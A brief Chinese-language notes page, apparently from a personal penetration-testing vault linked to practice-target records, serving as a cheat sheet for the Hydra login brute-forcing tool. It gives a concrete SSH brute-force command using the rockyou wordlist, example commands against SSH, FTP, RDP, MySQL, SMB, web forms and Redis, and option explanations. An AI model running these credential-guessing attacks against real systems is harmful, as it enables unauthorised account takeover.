> 关联：[[index|常用命令]]、[[nmap]]、[[../靶机记录/index|靶机记录]]


* hydra -l mingmingjiu -P /usr/share/wordlists/rockyou.txt ssh://10.241.108.244 -t 4 -e nsr


| 参数          | 服务类型        | 示例                                                   |
| ----------- | ----------- | ---------------------------------------------------- |
| `ssh`       | SSH登录       | `hydra -l root -P pass.txt ssh://10.0.0.1`           |
| `ftp`       | FTP登录       | `hydra -L users.txt -P pass.txt ftp://10.0.0.1`      |
| `rdp`       | Windows远程桌面 | `hydra -l admin -P pass.txt rdp://10.0.0.1`          |
| `mysql`     | MySQL数据库    | `hydra -l root -P pass.txt mysql://10.0.0.1`         |
| `smb`       | Windows共享   | `hydra -l administrator -P pass.txt smb://10.0.0.1`  |
| `http-post` | Web表单POST   | `hydra -l admin -P pass.txt 10.0.0.1 http-post-form` |
| `redis`     | Redis数据库    | `hydra -P pass.txt redis://10.0.0.1`                 |

|参数|作用|说明|
|---|---|---|
|`-s`|指定端口|`-s 2222`（SSH非标准端口）|
|`-e nsr`|额外尝试|`n`=空密码, `s`=用户名当密码, `r`=反向用户名|
|`-o`|保存结果|`-o result.txt`|
|`-R`|恢复中断扫描|从上次进度继续|
|`-w`|超时时间|`-w 5`（5秒超时，默认30）|
|`-W`|等待时间|`-W 3`（试错后等待3秒）|
